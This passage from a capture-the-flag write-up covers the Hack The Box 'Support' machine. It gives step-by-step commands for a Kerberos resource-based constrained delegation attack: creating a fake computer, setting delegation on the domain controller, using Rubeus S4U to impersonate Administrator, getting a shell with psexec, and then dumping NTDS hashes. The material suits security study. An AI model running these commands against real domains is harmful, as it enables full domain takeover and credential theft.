<li>Permissions like <code>GenericWrite</code>, <code>WriteDacl</code>, <code>WriteProperty</code>, etc., give access to modify the delegation.</li>
<li>This contrasts with other delegation methods that require domain admin rights.</li>
</ul>
<h3 id="the-attack-kerberos-resource-based-constrained-delegation-computer-object-takeover">The attack, Kerberos Resource-based Constrained Delegation - Computer Object Takeover:</h3>
<h4 id="the-attack--high-level">The attack (High Level):</h4>
<ol>
<li>We are going to create a fake computer on the domain.</li>
<li>Configure RBCD by setting the <code>msds-allowedtoactonbehalfofotheridentity</code> to allow our computer to act on behalf of the DC.</li>
<li>Perform &amp; S4U attack to get a kerberos ticket on behalf of the administrator.</li>
<li>Pass the admins ticket to get RCE on the target.</li>
</ol>
<h4 id="attack-requirements">Attack Requirements:</h4>
<h5 id="requirement-1-ensure-we-can-add-machines-to-the-domain">Requirement 1 - Ensure we can add machines to the domain:</h5>
<ul>
<li>To check if our user has the ability to do this we need to check the <code>ms-ds-machineaccountquota</code> attribute.</li>
<li>By default it&rsquo;s set to 10 on domains, but I have seen domains where the admins have, rightfully, disabled it.</li>
<li><strong>Checking it using netexec</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-182307_.png">
</figure>
</li>
<li>As we can see it&rsquo;s set to 10 this means we can add up-to 10 machines to this domain. So we can perform the attack</li>
<li><input checked="" disabled="" type="checkbox"> Satisfied</li>
</ul>
</li>
</ul>
<h5 id="requirement-2-a-target-computer">Requirement 2 - A target computer:</h5>
<ul>
<li>We know this is the DC of the domain (and we only have 1 target for this so it has to be that)
<ul>
<li><input checked="" disabled="" type="checkbox"> Satisfied</li>
</ul>
</li>
</ul>
<h5 id="requirement-3-admins-on-the-domain">Requirement 3 - Admins on the domain:</h5>
<ul>
<li>The LDAP query for this is pretty simple:
<ul>
<li><code>&quot;(&amp;(objectClass=Person)(adminCount=1))&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-09-06-082323_.png">
</figure>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> Satisfied</li>
</ul>
<h5 id="requirement-4-there-must-be-at-least-one-domain-controller-running-windows-server-2012-or-newer-in-the-environment-dot">Requirement 4 - There must be at least One Domain Controller running Windows Server 2012 or newer in the environment.</h5>
<ul>
<li>At the start of the engagement we can see that the level of the <code>domainFunctionaility</code> level is 7. Level 7, requires that the domain environment be running Windows Server 2016 or newer.
<ul>
<li><input checked="" disabled="" type="checkbox"> Satisfied</li>
</ul>
</li>
</ul>
<h5 id="requirement-5-the-msds-allowedtoactonbehalfofotheridentity-must-be-empty">Requirement 5 - The <code>msds-allowedtoactonbehalfofotheridentity</code> must be empty:</h5>
<ul>
<li>This attribute allows a service to impersonate or act on behalf of another account (e.g., a user or computer) when accessing network resources. Which is exactly what we need, as our fake computer will act on behalf of the DC.</li>
<li>I upload <code>PowerView.ps1</code> to the host &amp; then run the following command:
<ul>
<li><code>Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity</code></li>
<li><strong>Check the Value</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-06-090432_.png">
</figure>
</li>
<li>We can see it&rsquo;s empty, this is good, as it means we can set the value. If this was already set we could not progress unless we controlled that specific account.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="requirement-6-various-fake-machine-requirements">Requirement 6 - Various Fake Machine Requirements:</h5>
<ul>
<li>We actually don&rsquo;t need to worry about these at the moment, these will be generated whilst we perform the attack.
<ol>
<li>The Fake Computer SID</li>
<li>The Name of Fake Computer</li>
<li>The Fake Computer Password</li>
</ol>
</li>
</ul>
<h2 id="4-dot-ownership">4. Ownership:</h2>
<h3 id="performing-the-attack">Performing the Attack:</h3>
<ul>
<li><strong>Great video of the attack here</strong>:
<ul>
<li><a href="https://youtu.be/RUbADHcBLKg?si=bro7uomiQtukaIpe&amp;t=563">https://youtu.be/RUbADHcBLKg?si=bro7uomiQtukaIpe&amp;t=563</a></li>
</ul>
</li>
</ul>
<h4 id="1-dot-add-the-computer">1. Add the Computer:</h4>
<ol>
<li>
<p><strong>Create the computer using Impacket</strong>:</p>
<ul>
<li><code>impacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'hackme' -dc-ip $dcip support.htb/support</code></li>
<li><figure><img src="/ox-hugo/2024-09-06-093344_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I verify the computer was made using PowerView</strong>:</p>
<ul>
<li><code>Get-AdComputer -identity bloodstiller</code></li>
<li><figure><img src="/ox-hugo/2024-09-06-094807_.png">
</figure>

<ul>
<li><strong>Note</strong>: be patient, this can hang for a number of seconds!</li>
</ul>
</li>
<li>I also grab the SID of the computer as we will need this moving forward:
<ul>
<li><code>S-1-5-21-1677581083-3380853377-188903654-6101</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="2-dot-modify-the-msds-allowedtoactonbehalfofotheridentity-value-on-the-target">2. Modify the <code>msds-allowedtoactonbehalfofotheridentity</code> value on the target:</h4>
<ol>
<li>
<p><strong>Configure RBCD Using Sharpview</strong></p>
<ol>
<li>
<p><!-- raw HTML omitted -->Verity the <code>PrincipalAllowedToDelegateToAccount</code> value is empty<!-- raw HTML omitted -->:</p>
<ul>
<li><code>Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount</code></li>
<li><figure><img src="/ox-hugo/2024-09-06-103305_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->Add our computer as to the <code>PrincipalAllowedToDelegateToAccount</code> value<!-- raw HTML omitted -->:</p>
<ul>
<li><code>Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount bloodstiller$</code></li>
<li><strong>Note</strong>: be patient, this can hang for a number of seconds!</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->Verify the attribute is set<!-- raw HTML omitted -->:</p>
<ul>
<li><code>Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount</code></li>
<li>It should now contain our fake computer name</li>
<li><figure><img src="/ox-hugo/2024-09-06-103346_.png">
</figure>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p><strong>Verify the</strong> <code>msds-allowedtoactonbehalfofotheridentity</code> <strong>value has changed</strong>:</p>
<ul>
<li>
<p><code>Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity</code></p>
</li>
<li>
<figure><img src="/ox-hugo/2024-09-06-111105_.png">
</figure>

</li>
<li>
<p>We can see it has but it&rsquo;s just a series of numbers? It&rsquo;s RAW bytes which we need to convert back to the SID to verify it works.</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="$TargetComputer%20=%20%22DC.support.htb%22%0a$RawBytes%20=%20Get-DomainComputer%20$TargetComputer%20-Properties%20%27msds-allowedtoactonbehalfofotheridentity%27%20%7c%20select%20-expand%20msds-allowedtoactonbehalfofotheridentity%0a$Descriptor%20=%20New-Object%20Security.AccessControl.RawSecurityDescriptor%20-ArgumentList%20$RawBytes,%200%0a$Descriptor.DiscretionaryAcl">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$TargetComputer = <span style="color:#e6db74">&#34;DC.support.htb&#34;</span>
</span></span><span style="display:flex;"><span>$RawBytes = Get-DomainComputer $TargetComputer -Properties <span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span> | select -expand msds-allowedtoactonbehalfofotheridentity
</span></span><span style="display:flex;"><span>$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$Descriptor.DiscretionaryAcl</span></span></code></pre></div>
    
</div>
</li>
<li>
<figure><img src="/ox-hugo/2024-09-06-114904_.png">
</figure>

<ul>
<li>As we can see the <code>AceType</code> is set to <code>AcessAllowed</code>
<ul>
<li><strong>AceType</strong>: Represents the type of Access Control Entry (ACE) in the Access Control List (ACL).
<ul>
<li>In this case, the value is <code>AccessAllowed</code>, meaning it grants permission to the associated <code>SecurityIdentifier</code>.(SID).</li>
</ul>
</li>
<li>And it has the SID from the fake machine we made earlier so therefore it means that the ACE is set to allow our machine to act on behalf of the domain controller <code>DC.SUPPORT.HTB</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-06-114728_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Minor recap</strong>:</p>
<ul>
<li>We have created a fake machine on the domain.</li>
<li>We have configured our machine to act on behalf of <code>DC.SUPPORT.HTB</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="3-dot-craft-kerberos-ticket-with-rubeus-for-local-admin-on-dc01">3. Craft Kerberos Ticket with Rubeus for local admin on DC01:</h4>
<ol>
<li>
<p><strong>Retrieve the password hash that was used to create the computer object</strong>:</p>
<ul>
<li><code>.\Rubeus.exe hash /password:hackme /user:bloodstiller$ /domain:support.htb</code>
<ul>
<li><strong>Breakdown</strong>:
<ul>
<li><code>hash</code>: Instructs Rubeus to extract a hash.</li>
<li><code>/password:hackme</code>: Specifies the password for the user (hackme).</li>
<li><code>/user:bloodstiller$</code>: Specifies the username of the account we want the password for (bloodstiller$).
<ul>
<li>Note we have the <code>$</code> as this is a machine account</li>
</ul>
</li>
<li><code>/domain:support.htb</code>: Specifies the domain (support.htb).</li>
</ul>
</li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-09-06-131233_.png">
</figure>
</li>
<li>We need this so we can craft tickets.
<ul>
<li>Hash = <code>601EAB3FDFB146C4ECD8F800C987D621</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Generate Kerberos tickets for the Administrator by peforming the S4U attack</strong>:</p>
<ul>
<li><code>.\rubeus.exe s4u /user:bloodstiller$ /rc4:601EAB3FDFB146C4ECD8F800C987D621 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt /nowrap</code>
<ul>
<li><strong>Breakdown</strong>:
<ul>
<li><code>s4u</code>: Service for User functionality, used to request a service ticket for a user.</li>
<li><code>/user:bloodstiller$</code>: Specifies the user (bloodstiller$), (usually a service account).</li>
<li><code>/rc4:601EAB3FDFB146C4ECD8F800C987D621</code>: The RC4-HMAC key (NTLM hash) for the user (bloodstiller$).</li>
<li><code>/impersonateuser:Administrator</code>: Specifies the user to impersonate (Administrator).</li>
<li><code>/msdsspn:cifs/dc.support.htb</code>: Specifies the SPN (Service Principal Name) for the service to request a ticket (CIFS on dc.support.htb).</li>
<li><code>/domain:support.htb</code>: Specifies the domain (support.htb).</li>
<li><code>/ptt</code>: Pass-the-ticket option to inject the resulting ticket into memory for immediate use.</li>
<li><code>/nowrap</code>: Ensures the ticket is not Base64-encoded (used for better formatting).
<ul>
<li>No idea why nowrap is not standard for the output…</li>
</ul>
</li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-09-06-132226_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="4-dot-root-and-x2026-dot-dot-right">4. Root…..right?</h4>
<ul>
<li>We should be able to access the necessary resources locally as we have performed a PTT attack but for some reason it doesn&rsquo;t work, (I actually went to the creators page to see why &amp; it doesn&rsquo;t work for him either so I am not crazy)
<ul>
<li><a href="https://0xdf.gitlab.io/2022/12/17/htb-support.html#get-domain-tgt">https://0xdf.gitlab.io/2022/12/17/htb-support.html#get-domain-tgt</a></li>
<li><figure><img src="/ox-hugo/2024-09-06-145712_.png">
</figure>
</li>
<li>Instead we will need to convert our tickets and access the target it a different wat.</li>
</ul>
</li>
</ul>
<h4 id="5-dot-convert-our-tickets-for-use-on-linux">5. Convert our tickets for use on Linux:</h4>
<ul>
<li>For all intents &amp; purposes we now have everything we need to access the domain, however we need to perform some conversions before we can get RCE on the DC from our linux host, luckily we can do this with the impacket-tool <code>tickerConverter</code>
<ol>
<li>
<p><strong>We take the base64 encoded string from rubeus and put into a file called</strong> <code>b64.ticket</code>:</p>
</li>
<li>
<p><strong>We then decode that ticket whilst piping it into another file called</strong> <code>admin.kirbi</code>:</p>
<ul>
<li><code>base64 -d b64.ticket &gt; admin.kirbi</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-06-135405_.png">
</figure>
</li>
<li><code>.kirbi</code> is the extension required for us to convert our ticket.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>We then use impacket-ticketconvert to convert our</strong> <code>.kirbi</code> <strong>to a</strong> <code>.ccache</code></p>
<ul>
<li><code>ccache</code>: (Credential Cache) files are used in Linux systems to store Kerberos tickets and other security credentials obtained through the Kerberos authentication process.
<ul>
<li><code>impacket-ticketConverter admin.kirbi admin.ccache</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-06-135511_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Set the</strong> <code>KRB5CCNAME</code> <strong>Variable &amp; get root</strong></p>
<ul>
<li><code>KR5CCNAME</code> is an Environment variable used by Kerberos 5 (KRB5) used by Linux as pointer to the <code>.ccache</code> file</li>
<li><code>KRB5CCNAME=admin.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-06-135652_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="5-dot-pillaging-persistence">5. Pillaging/Persistence:</h2>
<ul>
<li>
<p><strong>Initially I try and run Secrets-Dump but it&rsquo;s not playing ball</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-074332_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>So I upload</strong> <code>LaZagne.exe</code>:</p>
<ul>
<li>I find nothing other than the machine hash, which will not be crackable as these are handled by the OS itself, extremely long and rotated often.
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-082550_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Dumping NTDS via netexec</strong>:</p>
<ul>
<li>So now I have all the hashes from NTDS, including Domain Admin, I have complete domain ownership.
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-082319_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Verify The Admin Hash Works</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-08-082651_.png">
</figure>
</li>
<li>It works, so now I can conclude this box as I can regain entry anytime via the Admin hash or any of the hashes I have.</li>
</ul>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned about XOR and reverse engineering the encryption.</li>
<li>I was rusty on kerberos so took me some time to get my head around RBCD again as I haven&rsquo;t done it in some time.</li>
<li>I re-learned about S4U attacks as it had been some time.</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>I was an idiot and didn&rsquo;t change my hosts file for ages after a box reboot and couldn&rsquo;t figure out why my LDAP binds were not working.</li>
<li>Should have dumped NTDS prior to running LaZagne.exe &amp; Secrets-Dump.</li>
</ol>
<h3 id="thoughts">Thoughts:</h3>
<ul>
<li>Easy my ass….reverse engineering a binary, doing an RBCD kerberos attack that should work but doesn&rsquo;t so we have to export tickets to access remotely. For me this was an easy to medium box.</li>
</ul>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>– Bloodstiller</p>
<p>– Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        5538
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.135.0</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Sep 06 2024 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
